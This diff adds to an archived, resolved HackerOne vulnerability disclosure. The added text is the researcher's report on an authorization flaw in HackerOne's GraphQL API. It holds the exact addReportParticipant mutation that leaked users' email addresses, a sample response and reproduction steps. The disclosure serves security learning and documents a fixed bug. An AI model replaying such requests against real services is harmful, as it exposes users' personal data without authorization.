@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Improper Authorization"
 enriched: true
+body: true
 date: 2020-02-20
 submitted: 2020-02-11T05:53:53.346Z
 bounty_usd: null
@@ -74,6 +75,38 @@ This change was the mitigating fix for resolving this vulnerability. It was depl
 ## Identify sensitive database fields being added to GraphQL
 
 HackerOne maintains a list of sensitive database fields. The application security team is planning to leverage this list to have engineers acknowledge that they’ve, to their knowledge, properly implemented the authorization logic when they put up a code merge request. This change is expected to be implemented in Q1 2020.
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+**Summary:**
+Email  id  of all hackerone users disclosure
+
+**Description:**
+There is an flaw , with that i can get all hackerone users email id 
+
+### Steps To Reproduce
+
+1. Invoke the below graphql call
+
+POST /graphql HTTP/1.1
+
+```{"query":"mutation Revoke_credential_mutation($input_0:AddReportParticipantInput!) {addReportParticipant(input:$input_0) {clientMutationId,...F1}}  fragment F1 on AddReportParticipantPayload {clientMutationId,was_successful,errors{nodes{message}},invitation{email,token}}","variables":{"input_0":{"report_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE=","email":"██████████","username":"jobert"}}}```
+
+you will get below response
+
+```
+{"data":{"addReportParticipant":{"clientMutationId":null,"was_successful":true,"errors":{"nodes":[]},"invitation":{"email":"████","token":null}}}}
+```
+
+2.  to reproduce from your account, create one test program, and create one report for that program, get that report id 
+gid://hackerone/Report/626371 (here 626371 my test program's report id)  convert it into base 64, replace that id with the "report_id" in the above graphql query 
+3.   Done
+
+## Impact
+
+PII disclosed
 
 ## Timeline
 
